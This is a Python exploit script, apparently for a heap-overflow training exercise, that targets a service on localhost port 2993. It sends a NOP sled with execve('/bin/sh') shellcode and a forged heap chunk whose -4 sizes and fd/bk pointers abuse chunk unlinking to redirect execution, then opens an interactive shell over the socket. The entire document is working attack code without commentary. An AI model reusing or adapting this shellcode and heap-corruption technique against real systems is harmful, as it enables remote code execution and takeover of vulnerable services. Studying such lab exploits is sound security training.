# set follow-fork-mode child
# set detach-on-fork 
# b *0x0804be10
# b *0x0804be18

import socket
import telnetlib

HOST = "127.0.0.1"
PORT = 2993

minus_for = b"\xfc\xff\xff\xff"
fd = b"\x10\xd4\x04\x08"
bk = b"\x20\xe0\x04\x08"

JUMP_SHELLCODE = minus_for+minus_for+fd+bk
SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x2f"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    payload_1 = "FSRD".encode("ascii")+b"\x90"*(128 - (len(SHELLCODE)+4))+SHELLCODE
    payload_2 = "FSRDROOT/".encode("ascii")+JUMP_SHELLCODE+b"\x41"*(128-(len(JUMP_SHELLCODE)+9))
    payload_3 = "BBBB".encode("ascii")

    s.sendall(payload_1)
    s.sendall(payload_2)
    s.sendall(payload_3)

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
